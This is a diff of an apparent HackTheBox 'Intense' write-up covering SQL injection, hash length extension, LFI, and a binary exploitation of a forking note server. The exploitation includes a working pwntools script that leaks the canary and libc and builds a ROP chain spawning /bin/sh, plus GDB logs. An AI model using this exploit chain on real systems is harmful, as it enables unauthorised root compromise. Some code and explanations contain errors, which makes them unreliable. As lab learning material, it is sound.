@@ -2,9 +2,14 @@
 title: HackTheBox — Intense Writeup
 date: 2020-11-14 04:41:00 +0530
 categories: [HackTheBox,Linux Machines]
-tags: [hackthebox, intense, ctf, linux, code review, code vulnerable, sqli, crack cookies, python, lfi, snmp, shell, exploit, analysis code, buffer overflow, debugging, canary, aslr, rop, privilege escaltion, root]
+tags: [hackthebox, intense, ctf, linux, code review, code vulnerable, sqli, crack cookies, python, lfi, snmp, shell, exploit, analysis code, buffer overflow, binart exploitation, debugging, canary, aslr, rop, privilege escaltion, ssh tunnel, root]
 image: /assets/img/Posts/Intense.jpeg
 ---
+>/
+>
+>/
+>Its difficulty level is hard and has an IP 10.10.10.195
+
 ## Reconnaissance
 
 I started with basic `nmap` enumeration.
@@ -235,6 +240,8 @@ cookie = "dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYz
 user_guest, secret_guest = cookie.split(".")
 cookie_guest = b64decode(user_guest) + b64decode(secret_guest)
 print cookie_guest
+```
+```shell
 ezi0x00@kali:~/HTB/Intense$ python cookie.py
 username=guest;secret=84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec;=��[�����=nZ�����+>��
                                                                                                             ���▒v�x�
@@ -255,7 +262,7 @@ Payload:
 With sql listing request, i can't return any Db information, that's mean this function can’t match the exact length of the `secret` string for the user who has role 1 that is Admin. but i can do an injection by guessing admin secret through return message.
 
 after search i found that we can bruteforce password using `substr()` function.
-when we decode the guest cookie we found The length of `Guest’s secret` is 64 means that we need to loop through the `SQLi` until we get 64. So along with my friend, I made a python [**script**](https://github/0xN1ghtR1ngs) to bruteforce it.
+when we decode the guest cookie we found The length of `Guest’s secret` is 64 means that we need to loop through the `SQLi` until we get 64. So along with my friend, I made a python [**script**](https://github.com/0xN1ghtR1ngs/CTF-Scripts/blob/main/IntenseMachine-HTB/brute_hash.py) to bruteforce it.
 
 and here the admin cookie: 
 ```
@@ -264,7 +271,7 @@ The password: f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105
 ```
 It's sha256 hash, we need to crack it.
 From the source code we see that this signature is an sha256(data+RANDOM_KEY) concatenated to the base64 user. 
-I've looked for a long time for how we can crack this hash and i found this [**article**](https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks), and i made [**script**](https://github.com/0xN1ghtR1ngs) to do this mission.
+I've looked for a long time for how we can crack this hash and i found this [**article**](https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks), and i made [**script**](https://github.com/0xN1ghtR1ngs/CTF-Scripts/blob/main/IntenseMachine-HTB/crackhash.py) to do this mission.
 
 and here we did it :"D
 ```
@@ -272,7 +279,6 @@ The cookie : auth=dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2Mj
 The lenght :11
 ```
 try it by edit cookie in browser.
-
 ![website](/assets/img/Posts/logincookieadmin.png)
 
 if you remember source code review from the app code source we have two routes in admin section, `logfile`,`logdir`
@@ -435,351 +441,710 @@ while (1) {
             close(newsockfd);
         }
 ```
-The server create a child process with fork() this process will handle the client request.
+The server create a child process by `fork()`, and here it became clearer that the server `handle_client` using sockets and `fork()`.
 
-`void handle_client(int sock)` this function use 3 cases 
-1. read from client command buffer and put into the note array
-2. copy data from an offset of the note array to an other offset `index` in the same array
-3. write the content of the note array
-and the buffer size is `1024`, and it's problem it will make `buff overflow`.
+let's see a `handle_client`
+```
+void handle_client(int sock)     {
+    char note[BUFFER_SIZE];
+    uint16_t index = 0;
+    uint8_t cmd;
+    // copy var
+    uint8_t buf_size;
+    uint16_t offset;
+    uint8_t copy_size;
+```
+this is `variables` pushed in buff, and before function we see `#define BUFFER_SIZE 1024` defines a macro named BUFFER_SIZE as an abbreviation for the token 1024, and it's problem it will make `buff overflow`.
+```
+while (1) {
 
-let's check executable file 
+        // get command ID
+        if (read(sock, &cmd, 1) != 1) {
+            exit(1);
+        }
+
+        switch(cmd) {
+            // write note
+            case 1:
+                if (read(sock, &buf_size, 1) != 1) {
+                    exit(1);
+                }
+
+                // prevent user to write over the buffer
+                if (index + buf_size > BUFFER_SIZE) {
+                    exit(1);
+                }
+
+                // write note
+                if (read(sock, &note[index], buf_size) != buf_size) {
+                    exit(1);
+                }
+
+                index += buf_size;
+
+
+            break;
+``` 
+read from client command buffer and put into the note array
+```           
+            // copy part of note to the end of the note
+            case 2:
+                // get offset from user want to copy
+                if (read(sock, &offset, 2) != 2) {
+                    exit(1);
+                }
+
+                // sanity check: offset must be > 0 and < index
+                if (offset < 0 || offset > index) {
+                    exit(1);
+                }
+
+                // get the size of the buffer we want to copy
+                if (read(sock, &copy_size, 1) != 1) {
+                    exit(1);
+                }
+
+                // prevent user to write over the buffer's note
+                if (index > BUFFER_SIZE) {
+                    exit(1);
+                }
+
+                // copy part of the buffer to the end 
+                memcpy(&note[index], &note[offset], copy_size);
+
+                index += copy_size;
+            break;
+```
+copy data from an offset of the note array to an other offset `index` in the same array
+```
+            // show note
+            case 3:
+                write(sock, note, index);
+            return;
+
+        }
+    }
+
+```
+write the content of the note array
+
+let's compile the code local on my machine with `-ggdb` flag adds debug symbols for easier debugging with source code. and check executable file.
 ```shell
-ezi0x00@kali:~/HTB/Intense$ checksec --file=note_server
+ezi0x00@kali:~/HTB/Intense$ gcc -Wall -pie -fPIE -fstack-protector-all -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro note_server.c -o note_local -ggdb
+ezi0x00@kali:~/HTB/Intense$ checksec --file=note_local
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
 Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   79) Symbols       No    0               2               note_server
 ```
-there are `canary protection`, so when we do `BOF`, canary will detect stack smash 	
+there are `PIE`, `RELRO -canary protection`, so when we do `BOF`, it's impossible canary will detect stack smash.
+my mood: 	
+[!website](/assets/img/Posts/7warat.jpg)
 
-this will be a simple ROP exploit, where I chain together gadgets, or small snippets of code that each move one or two pieces into place and return to the next one. To do this I'll need some gadgets. I'll also need a way to leak the canary, as well as the address space for the program, since PIE is enabled.
-**To prevent from the canary reuse with fork(). Use execve() after the fork(), sections "text" "data" and "bss" will change the memory and use a new random canary value.**
-
-With radare2 we can see the code where the random 8bytes canary is stored just on top of the stack and any buffer overflow trying to overwite the return address,  wil modify the canary QWORD before.
-Here is the code before the ret which will verify if the content of this QWORD is the same as the one created by the binary in the execution.
+There is no impossible that we can do that by `canary leak`.
+let's do some reverse in radare2 and focus on `sym.handle_client`.
 
 ```
-The code :
-││ │╎   0x55f984d95de6      488b45f8       mov rax, qword [var_8h]
-│   ││ │╎   0x55f984d95dea      644833042528.  xor rax, qword fs:[0x28]
-│   ││┌───< 0x55f984d95df3      740c           je 0x55f984d95e01
-│  ┌──────< 0x55f984d95df5      eb05           jmp 0x55f984d95dfc
-│  ││││││   ; CODE XREFS from sym.handle_client @ 0x55f984d95ce7, 0x55f984d95dc5
-│  │└└─└└─< 0x55f984d95df7      e9d3fdffff     jmp 0x55f984d95bcf
-│  │  │     ; CODE XREF from sym.handle_client @ 0x55f984d95df5
-│  └──────> 0x55f984d95dfc      e88ffbffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
-│     └───> 0x55f984d95e01      c9             leave
-└           0x55f984d95e02      c3             ret
+││ │╎  		0x0000144b      	488b45f8       mov rax, qword [var_8h]
+│   ││ │╎   0x0000144f      	644833042528.  sub rax, qword fs:[0x28]
+│   ││┌───< 0x00001458      	740c           je 0x1466
+│  ┌──────< 0x000045a      		eb05           jmp 0x1461
+│  ││││││   ; CODE XREFS from sym.handle_client @ 0x12a0, 0x134c, 0x142a
+│  │└└─└└─< 0x00001450      	e9d3fdffff     jmp 0x124e
+│  │  │     ; CODE XREF from sym.handle_client @ 0x145a
+│  └──────> 0x00001461      	e88ffbffff     call sym.imp.__stack_chk_fail ;[3] ; void __stack_chk_fail(void)
+│  │  │     ; CODE XREF from sym.handle_client @ 0x1458
+│     └───> 0x00001466      	c9             leave
+└           0x00001467      	c3             ret
 ```
+here we are, as we said we should find leak to can bypass all protections.
+we can see:
+1. the random `qword [var_8h]`  is stored on top of the stack and any buffer overflow trying to overwite the return address, will modify the canary QWORD before.
+2. subtract `qword [var_8h]` from `qword fs:[0x28]` if `ZF=1` jmp to leave, or call the function `imp.__stack_chk_fail`
 
-Binary compare the canary block from var_8h which "rbp-0x8" with the constant value of canary "fs:[0x28]"
-After the xor of the two QWORDS "rax" and "fs:[0x28]" it will jmp to the end of function to leave, or call the function "imp.__stack_chk_fail"
+let's `debug`, before that let's prepare `exploit` code cause we need that to calculate interesting things.
+```
+#!/usr/bin/env python3
 
-Find the offset where the canary begin: 
+import struct
+from pwn import *
+context.binary = ELF('./note_local')
+e = context.binary
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+#libc = ELF('./libc')
+p = remote("127.0.0.1", 5001)
+```
+you can understand this lines from this [**toutrial**](https://docs.pwntools.com/en/stable/intro.html)
+but what's mean libc?
+>is commonly used as a shorthand for the "standard C library", a library of standard functions that can be used by all C programs (and sometimes by programs in other languages). Because of some history (see below), use of the term "libc" to refer to the standard C library is somewhat ambiguous on Linux.
+>
+because this local machine just to know where is `libc` file  
+```
+ezi0x00@kali:~/HTB/Intense$ ldd note_server
+        linux-vdso.so.1 (0x00007ffc7a3e4000)
+        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4dde41e000)
+        /lib64/ld-linux-x86-64.so.2 (0x00007f4ddea12000)
+```
+```
+def write(data):
+    p.send("\x01")
+    p.send(p8(len(data)))
+    p.send(data)
 
-We can't directly write over the buffer, but we have to put the data into the note array. First through the command 1 and use the command 2 to define the offset from where we will write over the buffer.
-I create a "pattern_offset" with gdb, and put it in the notes[512] offset= 512, and put a breakpoint and read the "rbp-0x8" to find the location of the offset before the canary QWORD.
-I used gdb with (peda configuration) to debug this forked process.  like: 
+def copy(offset,size):
+    p.send("\x02")
+    p.send(p16(offset))
+    p.send(p8(size))
 
-Note: 
->To run gdb for something like this, I'll want to have follow-fork-mode child as I already saw that the server will fork the processing into a new process. I'll also want to set detach-on-fork off so that I don't have to constantly restart gdb. I did this by dropping those two into my ~/.gdbinit file, along with peda. 
+def read():
+    p.send("\x03")
+
+def exploit(canary,rop):
+    payload = b"A" * 8
+    payload += p64(canary)
+    payload += p64(rbp)
+    payload += bytes(rop)
+    junk = b"A" * (200 - len(payload))
+    write(payload + junk)
+    write("A"* 200)
+    write("A"* 200)
+    write("A"* 200)
+    write("A"* 224)
+    copy(0,len(payload))
+    read()
+    p.recv(1024 + len(payload))  
+```
+The script above defines four functions based on `void handle_client(int sock)`:
+. 
+1. The write() function takes in the size and data to send. 
+2. The copy() function takes in the offset and number of bytes to copy. 
+3. The read() function just reads from the server
+4. The exploit() function which takes in a payload. This payload is appended to the leaked canary, so that the program doesn't crash. The ROP chain is sent first, which places it at the top of the note buffer. Next, we fill up the note buffer up to 1024 as before. The `copy()` function is then called with the offset as 0 . This ends up copying the payload from the top of note to the bottom of note, hence overwriting the stack. The pwntools ROP helper can be used to automatically create ROP chains.
+>`p8` `p16` based on local variables.
+
+
+let's `debug` this shit.
+```shell
+ezi0x00@kali:~/HTB/Intense$ gdb ./note_local  
+.....sinp.....
+gef➤
+```
+```shell
+gef➤ set follow-fork-mode child
+```
+>`follow-fork-mode` is set to child, which instructs `GDB` to attach to the child after `fork`.
+```shell
+gef➤ b main
+Breakpoint 1 at 0x146c
+gef➤  r
+Starting program: /home/ezi0x00/HTB/Intense/note_local 
+
+Breakpoint 1, main (argc=0x1, argv=0x7fffffffe138) at note_server.c:93
+93      int main( int argc, char *argv[] ) 
+
+
+
+[ Legend: Modified register | Code | Heap | Stack | String ]
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x0000555555555468  →  <main+0> push rbp
+$rbx   : 0x0               
+$rcx   : 0x00007ffff7fad718  →  0x00007ffff7fafb00  →  0x0000000000000000
+$rdx   : 0x00007fffffffe148  →  0x00007fffffffe471  →  "SHELL=/bin/bash"
+$rsp   : 0x00007fffffffdf50  →  0x00007fffffffe138  →  0x00007fffffffe44c  →  "/home/ezi0x00/HTB/Intense/note_local"
+$rbp   : 0x00007fffffffe040  →  0x0000555555555690  →  <__libc_csu_init+0> push r15
+$rsi   : 0x00007fffffffe138  →  0x00007fffffffe44c  →  "/home/ezi0x00/HTB/Intense/note_local"
+$rdi   : 0x1               
+$rip   : 0x0000555555555480  →  <main+24> mov rax, QWORD PTR fs:0x28
+$r8    : 0x0               
+$r9    : 0x00007ffff7fe2180  →  <_dl_fini+0> push rbp
+$r10   : 0x7               
+$r11   : 0x2               
+$r12   : 0x0000555555555140  →  <_start+0> xor ebp, ebp
+$r13   : 0x0               
+$r14   : 0x0               
+$r15   : 0x0               
+$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007fffffffdf50│+0x0000: 0x00007fffffffe138  →  0x00007fffffffe44c  →  "/home/ezi0x00/HTB/Intense/note_local"         ← $rsp
+0x00007fffffffdf58│+0x0008: 0x0000000100000380
+0x00007fffffffdf60│+0x0010: 0x0000038000000380
+0x00007fffffffdf68│+0x0018: 0x0000038000000380
+0x00007fffffffdf70│+0x0020: 0x0000038000000380
+0x00007fffffffdf78│+0x0028: 0x0000038000000380
+0x00007fffffffdf80│+0x0030: 0x0000038000000380
+0x00007fffffffdf88│+0x0038: 0x0000038000000380
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+   0x55555555546c <main+4>         sub    rsp, 0xf0
+   0x555555555473 <main+11>        mov    DWORD PTR [rbp-0xe4], edi
+   0x555555555479 <main+17>        mov    QWORD PTR [rbp-0xf0], rsi
+ → 0x555555555480 <main+24>        mov    rax, QWORD PTR fs:0x28
+   0x555555555489 <main+33>        mov    QWORD PTR [rbp-0x8], rax
+   0x55555555548d <main+37>        xor    eax, eax
+   0x55555555548f <main+39>        lea    rdx, [rbp-0xa0]
+   0x555555555496 <main+46>        mov    eax, 0x0
+   0x55555555549b <main+51>        mov    ecx, 0x13
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── source:note_server.c+93 ────
+     88  
+     89  }
+     90  
+     91  
+     92  
+         // argc=0x1, argv=0x00007fffffffdf50  →  [...]  →  "/home/ezi0x00/HTB/Intense/note_local"
+ →   93  int main( int argc, char *argv[] ) {
+     94      int sockfd, newsockfd, portno;
+     95      unsigned int clilen;
+     96      struct sockaddr_in serv_addr, cli_addr;
+     97      int pid;
+     98  
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "note_local", stopped 0x555555555480 in main (), reason: BREAKPOINT
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x555555555480 → main(argc=0x1, argv=0x7fffffffe138)
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤    
+```
+breakpoint at `main` and `run`
+see `list` of code and know which line there are `write` case to breakpoint on it to send shell code cause this `case`  write the content of the note array. 
+then `continue` Parallel to running the script
 
 ```shell
-ezi0x00@kali:~/HTB/Intense$ cat ~/.gdbinit
-source ~/peda/peda.py
-set follow-fork-mode child
-set detach-on-fork off
-```
+gef➤  b 82
+Breakpoint 2 at 0x55555555542c: file note_server.c, line 82.
+gef➤  c
+Continuing.
+Continuing.
+[Attaching after process 15551 fork to child process 15562]
+[New inferior 2 (process 15562)]
+[Detaching after fork from parent process 15551]
+[Inferior 1 (process 15551) detached]
+[Switching to process 15562]
 
-Next, start the binary on it's own, and then attach to it with gdb using the -p [pid] option. It will then run up to the accept call and break, since that's where the program is waiting for input. Once a child thread completes, I'll just run inferiors 1 to go back to the main thread. Sometimes things get screwed up, and I'll just restart gdb.
+
+
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x3               
+$rbx   : 0x0               
+$rcx   : 0x00007ffff7edddee  →  0x5a77fffff0003d48 ("H="?)
+$rdx   : 0x1               
+$rsp   : 0x00007fffffffdb10  →  0x0000000000000003
+$rbp   : 0x00007fffffffdf40  →  0x00007fffffffe040  →  0x0000555555555690  →  <__libc_csu_init+0> push r15
+$rsi   : 0x00007fffffffdb29  →  0x4104ff0400ffe003
+$rdi   : 0x4               
+$rip   : 0x000055555555542c  →  <handle_client+519> movzx edx, WORD PTR [rbp-0x412]
+$r8    : 0x0               
+$r9    : 0x00007ffff7fb5540  →  0x00007ffff7fb5540  →  [loop detected]
+$r10   : 0x00007ffff7fb5810  →  0x0000000000002053 ("S "?)
+$r11   : 0x246             
+$r12   : 0x0000555555555140  →  <_start+0> xor ebp, ebp
+$r13   : 0x0               
+$r14   : 0x0               
+$r15   : 0x0               
+$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007fffffffdb10│+0x0000: 0x0000000000000003   ← $rsp
+0x00007fffffffdb18│+0x0008: 0x0000000400000000
+0x00007fffffffdb20│+0x0010: 0x0000000000000000
+0x00007fffffffdb28│+0x0018: 0x04ff0400ffe00300
+0x00007fffffffdb30│+0x0020: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+0x00007fffffffdb38│+0x0028: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+0x00007fffffffdb40│+0x0030: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+0x00007fffffffdb48│+0x0038: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+   0x555555555420 <handle_client+507> movzx  eax, al
+   0x555555555423 <handle_client+510> add    WORD PTR [rbp-0x412], ax
+   0x55555555542a <handle_client+517> jmp    0x55555555545c <handle_client+567>
+ → 0x55555555542c <handle_client+519> movzx  edx, WORD PTR [rbp-0x412]
+   0x555555555433 <handle_client+526> lea    rcx, [rbp-0x410]
+   0x55555555543a <handle_client+533> mov    eax, DWORD PTR [rbp-0x424]
+   0x555555555440 <handle_client+539> mov    rsi, rcx
+   0x555555555443 <handle_client+542> mov    edi, eax
+   0x555555555445 <handle_client+544> call   0x555555555050 <write@plt>
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── source:note_server.c+82 ────
+     77                  index += copy_size;
+     78              break;
+     79  
+     80              // show note
+     81              case 3:
+                         // sock=0x4, note=0x00007fffffffdb30  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+ →   82                  write(sock, note, index);
+     83              return;
+     84  
+     85          }
+     86      }
+     87  
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "note_local", stopped 0x55555555542c in handle_client (), reason: BREAKPOINT
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x55555555542c → handle_client(sock=0x4)
+[#1] 0x555555555674 → main(argc=0x1, argv=0x7fffffffe138)
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤  
+```
+```shell
+ezi0x00@kali:~/HTB/Intense$ python3 exploit.py 
+[*] '/home/ezi0x00/HTB/Intense/note_local'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[*] '/lib/x86_64-linux-gnu/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to 127.0.0.1 on port 5001: Done
+```
+>If it works for you, you'll see a lot of A in the stack.
+
+We already know that the canary places 8 byts at the top of the stack and that we fill the buffer with 1024
+let's do telescope to know offset to used in calculate the `stack` and `PIE` base address frome leak. 
+```shell
+
+gef➤  tel note+1024-0x8
+0x00007fffffffdf28│+0x0000: 0x4141414141414141
+0x00007fffffffdf30│+0x0008: 0x00007fffffffe040  →  0x0000555555555690  →  <__libc_csu_init+0> push r15
+0x00007fffffffdf38│+0x0010: 0xe5c621c0890f8900
+0x00007fffffffdf40│+0x0018: 0x00007fffffffe040  →  0x0000555555555690  →  <__libc_csu_init+0> push r15   ← $rbp
+0x00007fffffffdf48│+0x0020: 0x0000555555555674  →  <main+524> mov edi, 0x0
+0x00007fffffffdf50│+0x0028: 0x00007fffffffe138  →  0x00007fffffffe44c  →  "/home/ezi0x00/HTB/Intense/note_local"
+0x00007fffffffdf58│+0x0030: 0x0000000100000380
+0x00007fffffffdf60│+0x0038: 0x0000038000000380
+0x00007fffffffdf68│+0x0040: 0x0000001000000380
+0x00007fffffffdf70│+0x0048: 0x0000138900000003
+gef➤   
+```
+As we can see the note fault at `0x00007fffffffdf28`, and next address `0x00007fffffffe040` is rbp a `stack canary`. 
+Then we see the stack `canary` as a `PIE` address `0x0000555555555674`, and as we can notice this a base address from main so that's mean  `handle_client` will return, so that is address we want.
+and this `0x00007fffffffe138` location of base.
+
+se to know `offset` 
+```shell
+gef➤  p/x 0x0000555555555674-$_base()
+$1 = 0x1674
+gef➤  
+```
+let's finish it, but in the first we explain some things
+>I forgot to explain what kind of exploitation here. This is called ROP Exploitation, is a computer security exploit technique that allows an attacker to execute code in the presence of security defenses such as executable space protection and code signing. 
+>
+>In this technique, an attacker gains control of the call stack to hijack program control flow and then executes carefully chosen machine instruction sequences that are already present in the machine's memory, called "gadgets". 
+
+```
+log.info("Stage One - Bypass ASLR")
+write("A"* 200)
+write("A"* 200)
+write("A"* 200)
+write("A"* 200)
+write("A"* 224)
+copy(1024,255)
+read()
+p.recv(1024)
+p.recv(8)
+canary = u64(p.recv(8))
+log.success(f"Canary: {hex(canary)}")
+```
+fill up the stack to bypass `ASLR`
+
+```
+rbp = u64(p.recv(8))
+ret = u64(p.recv(8))
+base = u64(p.recv(8))
+log.success(f"Return: {hex(ret)}")
+
+e.address = ret - 0x1674 #PIE base 
+
+log.info("Stage two - Find libc")
+p = remote("127.0.0.1", 5001)
+rop = ROP(e)
+rop.call(e.plt['write'], [4, e.got['read']])
+exploit(canary,rop)
+
+read_leak = u64(p.recv(8))
+libc.address = read_leak - libc.sym['read']
+``` 
+this process is going to return to main and exit.
+>you should do it by hand cause offset based on your compiler.
+
+
+The ROP chain is sent in at the top of the note buffer, then fill up the note buffer to 1024 as before.
+
+```
+p = remote("127.0.0.1", 5001)
+
+rop = ROP(e)
+rop.call(e.plt['write'], [4, e.got['read']])
+
+exploit(canary,rop)
+
+read_leak = u64(p.recv(8))
+log.success(f"Libc leak : {hex(leak)}")
+libc.address = leak - libc.sym['read'] 
+```
+We create a ROP chain to call the `write()`, with the first argument (file descriptor) set to 4. This will remain constant for a given forked process.
+Next, the second argument (buffer) is set to the `GOT` address of the `read()`, and `libc.address = leak - libc.sym['read']` to calculate libc base.
 
 ```shell
-ezi0x00@kali:~/HTB/Intense$ gdb - p pid
+ef➤  b 82
+Breakpoint 2 at 0x55555555542c: file note_server.c, line 82.
+gef➤  c
+Continuing.
+[Attaching after process 8182 fork to child process 8275]
+[New inferior 2 (process 8275)]
+[Detaching after fork from parent process 8182]
+[Inferior 1 (process 8182) detached]
+[Switching to process 8275]
+
+Thread 2.1 "note_local" hit Breakpoint 2, handle_client (sock=0x4) at note_server.c:82
+82                      write(sock, note, index);
+[ Legend: Modified register | Code | Heap | Stack | String ]
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x3               
+$rbx   : 0x0               
+$rcx   : 0x00007ffff7edddee  →  0x5a77fffff0003d48 ("H="?)
+$rdx   : 0x1               
+$rsp   : 0x00007fffffffdb10  →  0x0000000000000003
+$rbp   : 0x00007fffffffdf40  →  0x00007fffffffe040  →  0x0000555555555690  →  <__libc_csu_init+0> push r15
+$rsi   : 0x00007fffffffdb29  →  0x4104ff0400ffe003
+$rdi   : 0x4               
+$rip   : 0x000055555555542c  →  <handle_client+519> movzx edx, WORD PTR [rbp-0x412]
+$r8    : 0x0               
+$r9    : 0x00007ffff7fb5540  →  0x00007ffff7fb5540  →  [loop detected]
+$r10   : 0x00007ffff7fb5810  →  0x0000000000002053 ("S "?)
+$r11   : 0x246             
+$r12   : 0x0000555555555140  →  <_start+0> xor ebp, ebp
+$r13   : 0x0               
+$r14   : 0x0               
+$r15   : 0x0               
+$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
 ```
-
+here `$rdi   : 0x4` this is file descriptor.
 ```
-0x555555554de6 <handle_client+588>:	mov    rax,QWORD PTR [rbp-0x8]
-   0x555555554dea <handle_client+592>:	xor    rax,QWORD PTR fs:0x28
-   0x555555554df3 <handle_client+601>:	je     0x555555554e01 <handle_client+615>
-   0x555555554df5 <handle_client+603>:	jmp    0x555555554dfc <handle_client+610>
-   0x555555554df7 <handle_client+605>:	jmp    0x555555554bcf <handle_client+53>
+log.info("Stage Three - pwn")
+p = remote("127.0.0.1", 5001)
+rop = ROP(libc)
+binsh = next(libc.search(b"/bin/sh\x00"))
+rop.dup2(4,0)
+rop.dup2(4,1)
+rop.dup2(4,2)
+rop.execv(binsh,0) 
+exploit(canary,rop)
 
-
-$ gdb-peda$ break *handle_client+588
-$ gdb-peda$ show follow-fork-mode             (to follow any created fork process,if not already puted into .gdbinit)
-$ run
- 
-gdb-peda$ pattern_create 255
-'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%'
-
-
-gdb-peda$ x/3xg $rbp-0x8 
-0x7fffffff8fb8:	0x6e41412441414241	0x41412d4141434141
-0x7fffffff8fc8:	0x413b414144414128
+p.interactive()
 ```
+The snippet above generates a new ROP chain, which duplicates stdin and stdout to fd 4. Next, execv(""/bin/sh", NULL) is called to spawn a shell
 
-Here we have the content of '$rbp-0x8' where the canary is stored. And with gdb we can found how much offset before this address:
+Now we have prepared everything to access the `root`, we just need to reverse that process instead of the local machine, but rather make it on the victim box
+First, we need to do an `ssh` tunnel for Doing a Local Port Forward with the `Debian-SNMP` use
 
+we will generate our key. And if you remember when we got `LFI` and saw `passwd`, we noticed that there is `/var/lib/snmp:/bin/false`, there you will find the `auth key` for the `ssh`.
+```shell
+Debian-snmp@intense:/var/lib/snmp$ ls -lah
+total 36K
+drwxr-xr-x  8 Debian-snmp Debian-snmp 4.0K Nov 18 23:12 .
+drwxr-xr-x 38 root        root        4.0K Nov 16  2019 ..
+drwx------  2 Debian-snmp Debian-snmp 4.0K Nov 16  2019 .cache
+drwx------  3 Debian-snmp Debian-snmp 4.0K Nov 16  2019 .gnupg
+drwxr-xr-x  3 Debian-snmp Debian-snmp 4.0K Nov 18 23:12 .local
+drwx------  2 root        root        4.0K Nov 16  2019 mib_indexes
+drwxr-xr-x  4 Debian-snmp Debian-snmp 4.0K Nov 16  2019 mibs
+-rw-------  1 Debian-snmp Debian-snmp 1.1K Nov 18 06:08 snmpd.conf
+-rwx------  1 root        root           0 Jul  9 08:24 snmp.local.conf
+drwxr-xr-x  2 Debian-snmp Debian-snmp 4.0K Jun 30 09:00 .ssh
+Debian-snmp@intense:/var/lib/snmp$ cd .ssh
+
+Debian-snmp@intense:/var/lib/snmp/.ssh$ ls -lah
+total 12K
+drwxr-xr-x 2 Debian-snmp Debian-snmp 4.0K Jun 30 09:00 .
+drwxr-xr-x 8 Debian-snmp Debian-snmp 4.0K Nov 18 23:12 ..
+-rw-r--r-- 1 Debian-snmp Debian-snmp  395 Jun 30 09:34 authorized_keys
 ```
-gdb-peda$ pattern_offset 0x6e41412441414241
